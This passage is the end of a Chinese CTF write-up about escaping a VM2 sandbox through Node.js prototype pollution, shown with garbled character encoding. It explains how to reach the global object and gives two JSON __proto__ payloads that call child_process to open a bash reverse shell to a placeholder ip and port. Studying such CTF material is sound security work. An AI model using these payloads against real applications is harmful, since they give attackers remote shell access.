</span></span><span class=line><span class=cl><span class=p>})</span></span></span></code></pre></td></tr></table></div></div><p>å­˜åœ¨NodejsåŸå‹é“¾æ±¡æŸ“å’ŒVM2æ²™ç®±é€ƒé€¸</p><p>æœ€åç”Ÿæˆçš„payloadå¦‚ä¸‹ï¼ŒæŠŠipå’Œportæ”¹æˆè‡ªå·±çš„vpså¼¹shellå³å¯</p><ul><li><p>let res = import(&rsquo;./app.js&rsquo;);ä¼šè¿”å›ä¸€ä¸ªPromiseå¯¹è±¡</p></li><li><p>ä»»ä½•å¯¹è±¡çš„ <code>toString</code> æ–¹æ³•éƒ½æ˜¯ä» <code>Function</code> å¯¹è±¡ç»§æ‰¿è€Œæ¥çš„ã€‚</p></li><li><p><code>Function</code> å¯¹è±¡çš„ <code>constructor</code> å±æ€§å¼•ç”¨äº† <code>Function</code> æ„é€ å‡½æ•°æœ¬èº«</p></li><li><p>res.toString.constructor(&ldquo;return this&rdquo;)()è¿”å›äº†å…¨å±€ä¸Šä¸‹æ–‡globalï¼Œä»è€Œè·å¾—äº†å…¨å±€ä¸Šä¸‹æ–‡çš„å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥è®¿é—®process</p></li></ul><json-viewer value='"{\n    \"shit\": 1,\n    \"__proto__\": {\n        \"shellcode\": \"let res = import(&#39;./app.js&#39;); res.toString.constructor(\\\"return this\\\") ().process.mainModule.require(\\\"child_process\\\").execSync(&#39;bash -c \\\"bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261\\\"&#39;).toString();\"\n    }\n}\n//ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ª\n{\n    \"shit\": 1,\n    \"__proto__\": {\n        \"shellcode\": \"let res = import(&#39;./app.js&#39;); res.toString.constructor(\\\"return process\\\") ().mainModule.require(\\\"child_process\\\").execSync(&#39;bash -c \\\"bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261\\\"&#39;).toString();\"\n    }\n}"' expand-depth=1 boxed copyable='{"copiedText":"å·²å¤åˆ¶","copyText":"å¤åˆ¶"}'></json-viewer></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="æ›´æ–°äº 2023-08-22 22:34:46">æ›´æ–°äº 2023-08-22&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/442fd1d/index.md title=é˜…è¯»åŸå§‹æ–‡æ¡£ class=link-to-markdown>é˜…è¯»åŸå§‹æ–‡æ¡£</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="åˆ†äº«åˆ° X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/442fd1d/ data-title=Misc-æ²™ç®±é€ƒé€¸ data-hashtags=Misc,CTF><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="åˆ†äº«åˆ° Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/442fd1d/ data-hashtag=Misc><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="åˆ†äº«åˆ° å¾®åš" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/442fd1d/ data-title=Misc-æ²™ç®±é€ƒé€¸><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/misc/ class=post-tag title="æ ‡ç­¾ - Misc">Misc</a><a href=/tags/ctf/ class=post-tag title="æ ‡ç­¾ - CTF">CTF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>è¿”å›</a></span>&nbsp;|&nbsp;<span><a href=/>ä¸»é¡µ</a></span></section></div><div class=post-nav><a href=/posts/5e91e89/ class=post-nav-item rel=prev title=CTF-Pwnå­¦ä¹ è®°å½•><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>CTF-Pwnå­¦ä¹ è®°å½•</a><a href=/posts/940b876/ class=post-nav-item rel=next title="2023 ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ› Misc Writeup">2023 ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ› Misc Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=ç›®å½•><h2 class=toc-title>ç›®å½•&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">ç”± <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> å¼ºåŠ›é©±åŠ¨ | ä¸»é¢˜ - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2025</span><span class=author itemprop=copyrightHolder>
<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=æ€»è®¿å®¢æ•°><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=æ€»è®¿é—®é‡><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=å›åˆ°é¡¶éƒ¨><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>è¯¥ç½‘ç«™åœ¨å¯ç”¨ JavaScript çš„æƒ…å†µä¸‹æ•ˆæœæœ€ä½³ã€‚</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/json-viewer-element/json-viewer-element.umd.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/442fd1d/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>